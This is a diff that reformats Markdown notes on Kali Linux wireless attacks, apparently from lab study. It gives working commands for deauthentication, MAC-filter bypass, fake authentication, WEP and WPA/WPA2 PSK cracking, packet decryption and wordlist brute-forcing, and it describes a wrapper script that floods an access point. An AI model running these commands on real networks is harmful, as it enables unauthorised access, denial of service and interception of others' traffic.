@@ -1,128 +1,272 @@
 # Wireless Basics in Kali Linux
 
-*ip link* to view the wireless devices and confirm the card has been detected
+## View Wireless Devices
 
-*iw dev ap stop/start* start or stop an access point - verify by running *ip link* and look for *UP*
+To view the wireless devices and confirm the card has been detected:
 
-*ip link set <device> up/down* e.g. *ip link set wlan0 up* - bring wireless card up
+```sh
+ip link
+```
 
-*airmon-ng* to verify it detects the card
+## Start or Stop an Access Point
 
-*airmon-ng check* to check for proccesses that could cause trouble
+To start or stop an access point and verify the status:
 
-*airmon-ng check kill* to kill those processes
+```sh
+iw dev ap stop
+iw dev ap start
+ip link
+```
 
-*airmon-ng start/stop <device>* to put device in monitor mode - check with *airmon-ng*
+Look for `UP` in the output to confirm the access point is active.
 
-*service NetworkManager start* to restart the network manager (got killed by airmon-ng)
+## Bring Wireless Card Up or Down
 
-*service wpa_supplicant start* to restart the wpa supplicant (got killed by aimon-ng)
+To bring the wireless card up or down:
 
-# Find out hidden SSID
+```sh
+ip link set <device> up
+ip link set <device> down
+```
 
-1. Wait for legitimate ProbeRequest and read out SSID or
+For example, to bring the `wlan0` card up:
 
-2. Find out MAC-Address and launch a deauthentication attack to force the clients to reconnect and send a Probe Package. *sudo aireplay-ng -0 5 -a 3C:84:6A:DF:AB:7C --ignore-negative wlan0mon*.
-*-0* is the deathtentication attack, 5 is the number of deauthentication packets to send and -a specifies the MAC address.
+```sh
+ip link set wlan0 up
+```
 
-3. Put this filter in Wireshark to see all the non-Beacon traffic going to and from the access point:
-*(wlan.bssid == <MAC>) && !(wlan.fc.type_subtype == 0x08)*
+## Verify and Manage Wireless Cards
 
-# Orient in Network + find out MAC and Device type
-*sudo airodump-ng wlan0mon* - captures current networks and clients in the area, requires mon mode
+To verify detection of the card:
 
-Navigate through the different filters by pressing the key *a*. To look up a device e.g. go to *sta only* and then copy the first 3 hex fields e.g. "E8:FD:F8" and paste it into *https://www.wireshark.org/tools/oui-lookup.html*, in this case it says Shanghai High-Flying Electronics Technology Co., Ltd.
+```sh
+airmon-ng
+```
 
-In Airodump press *TAB* to select a certain AP and then the arrow keys to navigate. Now press *m* to mark certain AP with a color. Now all the clients connected to this AP have the same color as well.
+To check for processes that could interfere:
 
-*s* key to sort by attributes like signal strength or MAC addr.
+```sh
+airmon-ng check
+```
 
-*sudo airodump-ng wlan0mon -w output* to create multiple output files to analyze
+To kill those processes:
 
-# Airgraph-ng - Visualize Network Topology captured by Airdump-ng
+```sh
+airmon-ng check kill
+```
 
-Run *sudo airgraph-ng -i test-01.csv -o capture.png -g CAPR* to pass the file *test-01.csv* into airgraph-ng and put the output in *capture.png*. -g is the type of the graph output, in this case client access point relationship.
+To put a device in monitor mode and verify:
 
-Other options are *-g CPG* for common probe graph to see probe requests
+```sh
+airmon-ng start <device>
+airmon-ng stop <device>
+```
 
-# How to beat MAC Filters
+## Restart Network Services
 
-run airodump-ng to find a whitlisted MAC and spoof it. 
+To restart network services that may have been stopped:
 
-*sudo airodump-ng -c 3 -a --bssid 3C:84:6A:DF:AB:7C wlan0mon* -> found: A8:93:4A:F2:C1:7D 
+```sh
+service NetworkManager start
+service wpa_supplicant start
+```
 
-*sudo ifconfig wlan0 down*
+## Find Hidden SSID
 
-run *sudo macchanger -m A8:93:4A:F2:C1:7D wlan0* to change the MAC and connect to the network
+1. Wait for legitimate ProbeRequests and read out SSID.
+2. Find out the MAC address and launch a deauthentication attack to force clients to reconnect and send a Probe Package:
 
-*sudo ifconfig wlan0 up* again, *sudo iwconfig wlan0 essid "Wireless Lab"* -> check if it works by running iwconfig wlan0
+    ```sh
+    sudo aireplay-ng -0 5 -a 3C:84:6A:DF:AB:7C --ignore-negative wlan0mon
+    ```
 
-# Bypass Shared Authentication
+    - `-0` specifies a deauthentication attack.
+    - `5` is the number of deauthentication packets to send.
+    - `-a` specifies the MAC address.
 
-Sniff packets between AP and client: 
+3. Use the following filter in Wireshark to see non-Beacon traffic:
 
+    ```sh
+    (wlan.bssid == <MAC>) && !(wlan.fc.type_subtype == 0x08)
+    ```
+
+## Orient in Network and Find MAC and Device Type
+
+To capture current networks and clients in the area:
+
+```sh
+sudo airodump-ng wlan0mon
+```
+
+- Press `a` to navigate through filters.
+- To look up a device, go to `sta only`, copy the first 3 hex fields (e.g., `E8:FD:F8`), and paste it into [Wireshark OUI Lookup](https://www.wireshark.org/tools/oui-lookup.html). For example, it might say "Shanghai High-Flying Electronics Technology Co., Ltd."
+
+In `airodump`, press `TAB` to select an AP, use arrow keys to navigate, and press `m` to mark the AP with a color. All clients connected to this AP will have the same color.
+
+Press `s` to sort by attributes like signal strength or MAC address.
+
+To create multiple output files for analysis:
+
+```sh
+sudo airodump-ng wlan0mon -w output
+```
+
+## Visualize Network Topology with Airgraph-ng
+
+To visualize network topology:
+
+```sh
+sudo airgraph-ng -i test-01.csv -o capture.png -g CAPR
+```
+
+- `-i` specifies the input CSV file.
+- `-o` specifies the output image file.
+- `-g` specifies the type of graph output (`CAPR` for client-access point relationship). Other options include `CPG` for common probe graph.
+
+## Beat MAC Filters
+
+To bypass MAC filters:
+
+1. Run `airodump-ng` to find a whitelisted MAC address and spoof it:
+
+    ```sh
+    sudo airodump-ng -c 3 -a --bssid 3C:84:6A:DF:AB:7C wlan0mon
+    ```
+
+    For example, you might find `A8:93:4A:F2:C1:7D`.
+
+2. Change the MAC address and connect to the network:
+
+    ```sh
+    sudo ifconfig wlan0 down
+    sudo macchanger -m A8:93:4A:F2:C1:7D wlan0
+    sudo ifconfig wlan0 up
+    sudo iwconfig wlan0 essid "Wireless Lab"
+    ```
+
+    Check if it works by running:
+
+    ```sh
+    iwconfig wlan0
+    ```
+
+## Bypass Shared Authentication
+
+To sniff packets between AP and client:
+
+```sh
 sudo airodump-ng wlan0mon --bssid 3C:84:6A:DF:AB:7C --channel 11 --write keystream
+```
 
-Either wait for them to connect to the AP or force a reconnect.
-Then there should be something in the AUTH column of the airodump window, for me it was "SKA", the reference book states "WEP" should be there. 
+Wait for the client to connect or force a reconnect. Look for AUTH column data in `airodump`. 
 
-After we collected the shared authentication exchange we can run 
-*sudo aireplay-ng -1 0 -e "Wireless Lab" -y keystream-01-3C-84-6A-DF-AB-7C.xor -a 3C:84:6A:DF:AB:7C -h AA:AA:AA:AA:AA:AA wlan0mon* to fake the shared authentication and connect to the client.
+To fake the shared authentication and connect:
 
-Also I coded a wrapper for the aireplay-ng programm to run this bypass multiple times with randomly generated SSIDs. When the client count is reached, the AP won't accept new clients essentially ddosing the AP.
-To run the script follow these commands:
-*chmod +x ddoswrapper.sh* making the script executable
-*sudo ./ddoswrapper.sh --ssid "AA:AA:AA:AA:AA:AA" --attempts 100* default attempts are 50.
-Have fun :D
+```sh
+sudo aireplay-ng -1 0 -e "Wireless Lab" -y keystream-01-3C-84-6A-DF-AB-7C.xor -a 3C:84:6A:DF:AB:7C -h AA:AA:AA:AA:AA:AA wlan0mon
+```
 
-# How to crack WEP
+To use a wrapper script for multiple attempts:
 
-run *airodump-ng wlan0mon* to find out the MAC address of the target router and the channel its operating in. 
+```sh
+chmod +x ddoswrapper.sh
+sudo ./ddoswrapper.sh --ssid "AA:AA:AA:AA:AA:AA" --attempts 100
+```
 
-Then run *sudo airodump-ng -c 3 -a --bssid 3C:84:6A:DF:AB:7C wlan0mon --write WEPDemo* with -c set to the channel, in this case 11 and bssid to the MAC of the router.
+Replace `100` with the number of attempts you want.
 
-Now connect to the router with fake authentication or wait till someone else does, because the access point will only accept packets from associated clients. airodump-ng should show the connected client(s). Never worked with that?
+## Crack WEP
 
-Replay ARP packets using*sudo aireplay-ng -3 -b 3C:84:6A:DF:AB:7C -h a8:93:4a:f2:c1:7d --ignore-negative-one wlan0mon* -h is one of the associated clients of the AP b is the MAC of the AP.
+1. Run `airodump-ng` to find the target router's MAC address and channel:
 
-Now just run *aircrack-ng WEPDemo-02.cap* to crack the key using the data collected by airodump-ng. This depends on the network speed and the key strength but shouldn't take much longer then 5-10 minutes.
+    ```sh
+    sudo airodump-ng wlan0mon
+    ```
 
-# How to crack WPA/WPA2 networks which are using PSK
+2. Capture data with:
 
-run *airodump-ng wlan0mon* to find out the MAC address of the target router and the channel its operating in. 
+    ```sh
+    sudo airodump-ng -c 3 -a --bssid 3C:84:6A:DF:AB:7C wlan0mon --write WEPDemo
+    ```
 
-Then run *airodump-ng -c 5 -a --bssid 3C:84:6A:DF:AB:7C wlan0mon --write WPACrackingDemo* with -c set to the channel, in this case 11 and bssid to the MAC of the router.
+    Replace `3C:84:6A:DF:AB:7C` with the MAC address and `3` with the channel.
 
-Now we force the other clients to reconnect or wait till someone connects. run *aireplay-ng --deauth 1 -a 3C:84:6A:DF:AB:7C wlan0mon --ignore-negative-one*. Now if the *Auth* section of airodump reads *PSK*, we can stop airodump, otherwise retry.
+3. Replay ARP packets:
 
-Crack the file using aircrack utility with the command *aircrack-ng Wsudo aircrack-ng WPACrackingDemo-01.cap -w /usr/share/wordlists/nmap.lst* using our captured .cap file and a wordlist preinstalled from kali. (Important, the worldlist is everything here so optimizing it for the region you are in or including know information is a good idea.)
+    ```sh
+    sudo aireplay-ng -3 -b 3C:84:6A:DF:AB:7C -h a8:93:4a:f2:c1:7d --ignore-negative-one wlan0mon
+    ```
 
-Of course in this example it will find the key since we included it in the wordlist but it only works if the key is in the wordlist!
+4. Crack the WEP key:
 
-# Speeding up the cracking process
+    ```sh
+    aircrack-ng WEPDemo-02.cap
+    ```
 
-The calculation of the Pre-Shared key using the PSK passphrase and the SSID through the PBKDF2 is very time/CPU consuming. The next step, which uses the key along with the parameters in the four-way handshake and verifying it against the MIC in the handshake is inexpensive and has different parameters everytime so we cannot precompute it. So we try to speed up the PSK (also called the Pairwise Master Key(PMK)) calculation as much as possible. 
+## Crack WPA/WPA2 Networks Using PSK
 
-Precalculate the PMK for a give SSID and worklist using *genpmk*. Run *sudo genpmk -f /usr/share/wordlists/nmap.lst -d PMK-WirelessLab -s "Wireless Lab"*
+1. Find the target router's MAC address and channel:
 
-Now crack the WPA/WPA2 passphrase using a different tool for variety cowpatty.
-Run *cowpatty -d PMK-WirelessLab -s "Wireless Lab" -r WPACrackingDemo-01.cap*
+    ```sh
+    sudo airodump-ng wlan0mon
+    ```
 
-# Decrypting WPA packets
+2. Capture WPA/WPA2 data:
 
-Use *airedecap-ng* to decrypt packages we captured. Run *sudo airdecap-ng -p abcdefgh -e "Wireless Lab" WPACrackingDemo-01.cap*
+    ```sh
+    sudo airodump-ng -c 5 -a --bssid 3C:84:6A:DF:AB:7C wlan0mon --write WPACrackingDemo
+    ```
 
-Now the decrypted packages are stored in *WPACrackingDemo-01-dec.cap* and can be analyzed using
-Wireshark or sth like *tshark*. E.g. *tshark -r WPACrackingDemo-01-dec.cap *
+3. Force clients to reconnect or wait for new connections:
 
-# Use Hydra to crack HTTP authentication
+    ```sh
+    sudo aireplay-ng --deauth 1 -a 3C:84:6A:DF:AB:7C wlan0mon --ignore-negative-one
+    ```
 
-In this case we generate a wordlist first to brute-force the password.
-Run *sudo crunch 8 8 abcdefghi -o testWordlist.txt* to create a wordlist containing from 8 to 8  characters all possible combinations of the letters abcdefghi and writes it in the specified file. 
+4. Crack the WPA/WPA2 passphrase:
 
-After this it gets a little tricky since we need to analyze the webpage in order to understand how it processes the password. We need to know if it is a POST or a GET request and alter the options accordingly. For this inspect the network tab in the browser. 
+    ```sh
+    sudo aircrack-ng WPACrackingDemo-01.cap -w /usr/share/wordlists/nmap.lst
+    ```
 
+    Use a wordlist that fits your region or known information.
 
+## Speed Up the Cracking Process
 
+1. Precalculate the PMK using `genpmk`:
 
+    ```sh
+    sudo genpmk -f /usr/share/wordlists/nmap.lst -d PMK-WirelessLab -s "Wireless Lab"
+    ```
 
+2. Crack the WPA/WPA2 passphrase using `cowpatty`:
+
+    ```sh
+    cowpatty -d PMK-WirelessLab -s "Wireless Lab" -r WPACrackingDemo-01.cap
+    ```
+
+## Decrypt WPA Packets
+
+To decrypt captured WPA packets:
+
+```sh
+sudo airdecap-ng -p abcdefgh -e "Wireless Lab" WPACrackingDemo-01.cap
+```
+
+The decrypted packets will be saved in `WPACrackingDemo-01-dec.cap` for analysis with Wireshark or `tshark`:
+
+```sh
+tshark -r WPACrackingDemo-01-dec.cap
+```
+
+## Crack HTTP Authentication with Hydra
+
+1. Create a wordlist:
+
+    ```sh
+    sudo crunch 8 8 abcdefghi -o testWordlist.txt
+    ```
+
+2. Analyze the webpage to understand how it processes the password (POST or GET request).
+
+3. Use Hydra to crack HTTP authentication with the generated wordlist.
